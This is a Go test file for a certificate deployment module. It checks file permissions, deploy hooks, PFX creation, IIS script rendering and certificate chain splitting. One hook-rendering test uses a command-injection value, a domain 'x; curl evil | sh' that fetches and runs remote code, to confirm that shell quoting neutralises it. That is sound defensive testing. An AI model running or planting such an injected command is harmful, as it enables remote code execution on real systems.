package deploy

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/iamartinlong/Argus/internal/domain"
)

func TestLocalDeployWritesFiles(t *testing.T) {
	dir := t.TempDir()
	certPath := filepath.Join(dir, "certs", "example.pem")
	keyPath := filepath.Join(dir, "certs", "example.key")

	local := Local{}
	result, err := local.Deploy(context.Background(), Payload{
		PrimaryDomain:  "example.com",
		CertificatePEM: "CERT-PEM",
		PrivateKeyPEM:  "KEY-PEM",
	}, map[string]any{"cert_path": certPath, "key_path": keyPath})
	if err != nil {
		t.Fatalf("deploy: %v", err)
	}
	if result.Checksum == "" {
		t.Fatal("missing checksum")
	}
	// 证书 644、私钥 600（仅非 Windows 平台验证，Windows 无 POSIX 权限）
	stat, err := os.Stat(certPath)
	if err != nil {
		t.Fatal(err)
	}
	if runtime.GOOS != "windows" && stat.Mode().Perm() != 0o644 {
		t.Fatalf("cert perm: %o", stat.Mode().Perm())
	}
	stat, err = os.Stat(keyPath)
	if err != nil {
		t.Fatal(err)
	}
	if runtime.GOOS != "windows" && stat.Mode().Perm() != 0o600 {
		t.Fatalf("key perm: %o", stat.Mode().Perm())
	}
	content, _ := os.ReadFile(certPath)
	if string(content) != "CERT-PEM" {
		t.Fatalf("unexpected content: %s", content)
	}
}

func TestLocalDeployHookFails(t *testing.T) {
	dir := t.TempDir()
	local := Local{}
	_, err := local.Deploy(context.Background(), Payload{PrimaryDomain: "x", CertificatePEM: "c", PrivateKeyPEM: "k"},
		map[string]any{"cert_path": filepath.Join(dir, "x.pem"), "post_command": "exit 1"})
	if err == nil {
		t.Fatal("expected hook failure")
	}
}

func TestLocalDeployMissingCertPath(t *testing.T) {
	local := Local{}
	_, err := local.Deploy(context.Background(), Payload{PrimaryDomain: "x", CertificatePEM: "c", PrivateKeyPEM: "k"}, map[string]any{})
	if err == nil {
		t.Fatal("expected error for missing cert_path")
	}
}

func TestRenderHook(t *testing.T) {
	out := renderHook("cp {cert_path} {key_path} {fullchain_path} {domain}", "/c.pem", "/k.pem",
		Payload{PrimaryDomain: "example.com"})
	if out != "cp '/c.pem' '/k.pem' '/c.pem' 'example.com'" {
		t.Fatalf("unexpected hook: %s", out)
	}
	// 恶意值：单引号与命令分隔符被隔离（纵深防御）
	out = renderHook("echo {domain}", "/c.pem", "/k.pem",
		Payload{PrimaryDomain: "x; curl evil | sh"})
	if out != "echo 'x; curl evil | sh'" {
		t.Fatalf("injection not neutralized: %s", out)
	}
	out = renderHook("echo {domain}", "/c.pem", "/k.pem",
		Payload{PrimaryDomain: "a'b"})
	if out != "echo 'a'\\''b'" {
		t.Fatalf("quote escaping failed: %s", out)
	}
}

func TestBuildPFX(t *testing.T) {
	certPEM, keyPEM := generateTestPair(t, "iis.example.com")
	pfx, err := BuildPFX(certPEM, keyPEM, "secret-pw")
	if err != nil {
		t.Fatalf("BuildPFX: %v", err)
	}
	if len(pfx) == 0 {
		t.Fatal("empty pfx")
	}
}

func TestRenderIISScript(t *testing.T) {
	script := RenderIISScript("C:\\certs\\x.pfx", "pw123", []int{443, 8443})
	if !strings.Contains(script, "Import-PfxCertificate") {
		t.Fatal("expected Import-PfxCertificate in IIS script")
	}
	if !strings.Contains(script, "443, 8443") {
		t.Fatalf("expected bindings in script: %s", script)
	}
	if strings.Contains(script, "{pfx_path}") {
		t.Fatal("unreplaced placeholder")
	}
}

func TestSplitChain(t *testing.T) {
	leaf, _ := generateTestPair(t, "split.example.com")
	// 构造 叶子 + 链 两段
	chain := leaf + leaf
	gotLeaf, gotRest, err := SplitChain(chain)
	if err != nil {
		t.Fatalf("SplitChain: %v", err)
	}
	if gotLeaf != leaf {
		t.Fatal("leaf mismatch")
	}
	if gotRest != leaf {
		t.Fatal("rest (chain) mismatch")
	}
	// 空输入
	l, r, err := SplitChain("")
	if err != nil {
		t.Fatalf("empty: %v", err)
	}
	if l != "" || r != "" {
		t.Fatalf("expected empty output, got %q %q", l, r)
	}
}

// generateTestPair 生成测试证书+私钥
func generateTestPair(t *testing.T, cn string) (string, string) {
	t.Helper()
	key, err := generateECKey()
	if err != nil {
		t.Fatal(err)
	}
	cert, err := selfSignedCert(cn, key)
	if err != nil {
		t.Fatal(err)
	}
	return cert, key
}

var _ = domain.DeployLocal
